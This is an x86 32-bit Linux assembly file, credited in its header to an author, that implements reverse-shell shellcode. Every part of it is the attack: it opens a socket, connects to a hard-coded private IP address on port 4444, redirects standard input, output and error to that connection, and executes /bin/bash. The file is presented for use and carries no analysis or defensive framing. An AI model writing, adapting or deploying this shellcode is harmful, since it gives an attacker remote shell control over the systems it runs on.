; Author  : Casanova5065
; Date    : 09-08-2023
; Subject : x-86/32-bit reverse-shell shellcode

global _start:

section .text
_start:

    ;clear the registers
    xor eax, eax
    xor ebx, ebx
    xor ecx, ecx
    xor edx, edx
    xor edi, edi

    ; invoking socketcall syscall

    mov eax, 0x66 ; (102) syscall number
    mov ebx, 0x1  ; (1) syscall number for SYS_SOCKET
    push ecx      ; PROTOCOL (0)
    push ebx      ; SOCK_STREAM (1)
    push 0x2      ; AF_INET (2)
    mov ecx, esp  ; ecx points to al three args
    int 0x80      ; invoke syscall

    mov edi, eax  ; store return fd in edi

    ; invoking socketcall again for SYS_CONNECT
    ; ip -> 0xc0a80147 -> 0x4701a8c0, port -> 4444 -> 0x5c11

    mov eax, 0x66 ; (102) syscall number
    pop ebx       ; (2) + 1 -> SYS_CONNECT   
    push 0x4701a8c0
    push word 0x5c11 
    push bx 
    mov ecx, esp
    push 0x10       ; length of the structure (16 bytes)
    push ecx 
    push edi 
    mov ecx, esp
    inc ebx 
    int 0x80 

    ; Invoking dup2 syscall
    mov eax, 0x3f ; (63)
    mov ebx, edi
    mov ecx, 0x0 ; stdin
    int 0x80

    mov eax, 0x3f ; (63)
    mov ebx, edi
    mov ecx, 0x01 ;stdout
    int 0x80

    mov eax, 0x3f ; (63)
    mov ebx, edi
    mov ecx, 0x02 ; stderr
    int 0x80

    mov eax, 0x0b
    mov ebx, shell  ; pass shell as 1st arg
	mov ecx, 0     
	mov edx, 0
	int 0x80

section .data
    shell db '/bin/bash', 0






    

